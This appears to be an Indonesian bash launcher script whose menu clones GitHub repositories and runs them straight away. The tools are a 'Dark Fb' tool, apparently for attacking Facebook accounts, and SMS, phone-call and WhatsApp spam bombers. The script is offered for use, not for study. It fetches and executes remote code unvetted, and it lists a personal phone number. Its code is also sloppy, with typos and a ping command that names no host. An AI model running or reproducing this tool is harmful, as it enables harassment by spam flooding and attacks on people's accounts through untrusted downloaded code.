#!/bin/bash
#Gunakan Tools Ini Dengan Bijak!
clear
figlet "Mr.Supreme"
echo "__________________________________"
echo "Author : Mr.Supreme"
echo "Kontak : 083114327847"
echo
echo "[ Pilih Menunya ]"
echo "[1] Dark Fb"
echo "[2] Stabilkan Jaringan"
echo "[3] Spam Brutal Sms"
echo "[4] Spam Telfon"
echo "[5] Spam Wa"
echo "[6] exit"
echo
read -p "[ Pilih Nomber ]>> " pill
#batas gan
if [ $pill = "1" ]
then
echo "Sedang Menginstall.... " :slepp 2
git clone https://github.com/V4N654T/dark-fb
cd dark-fb
python2 da.py
echo "Menginstall Selesai[√]"
fi
#batas gan
if [ $pill = "2" ]
then
ping -s 900
fi
#batas gan
if [ $pill = "3" ]
then
echo "Sedang Menginstall.... " :slepp 2
git clone https://github.com/B4N954N2-ID/Brutal-Sms
cd Brutal-Sms
python2 brutal.py
fi
#batas gan
if [ $pill = "4" ]
then
echo "Sedang Menginstall.... " :sleep 2
git clone https://github.com/B4N954N2-ID/spam-call
cd spam-call
bash Call.sh
echo "Menginstall Selesai[√]"
fi
#batas gan
if [ $pill = "5" ]
then
echo "Sedang Menginstall.... " :sleep 2
git clone https://github.com/B4N954N2-ID/spam-wa
cd spam-wa
python wa.py
fi
#batas gan
if [ $pill = "6" ]
then
echo "SAMPAI JUMPA"
exit
fi
